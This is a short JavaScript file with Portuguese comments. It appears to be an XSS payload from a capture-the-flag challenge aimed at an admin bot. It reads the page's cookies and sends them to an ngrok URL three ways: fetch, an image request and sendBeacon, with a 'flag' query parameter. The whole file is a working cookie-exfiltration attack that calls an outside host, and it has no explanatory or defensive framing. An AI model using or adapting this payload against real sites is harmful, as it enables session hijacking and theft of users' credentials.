(function() {
    const ngrokUrl = 'https://9364-2804-14d-5cd0-960f-b34a-67be-9929-7cb3.ngrok-free.app';
    const stolenCookie = document.cookie;

    console.log('[+] Script externo executado pelo bot! Cookie:', stolenCookie);

    // 1. Exfiltração via fetch
    try {
        fetch(`${ngrokUrl}/pwn?flag=${encodeURIComponent(stolenCookie)}`, {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (e) {}

    // 2. Exfiltração redundante via Image GET
    try {
        const img = new Image();
        img.src = `${ngrokUrl}/pwn_img?flag=${encodeURIComponent(stolenCookie)}`;
    } catch (e) {}

    // 3. Exfiltração via navigator.sendBeacon
    try {
        if (navigator.sendBeacon) {
            navigator.sendBeacon(`${ngrokUrl}/pwn_beacon?flag=${encodeURIComponent(stolenCookie)}`);
        }
    } catch (e) {}
})();
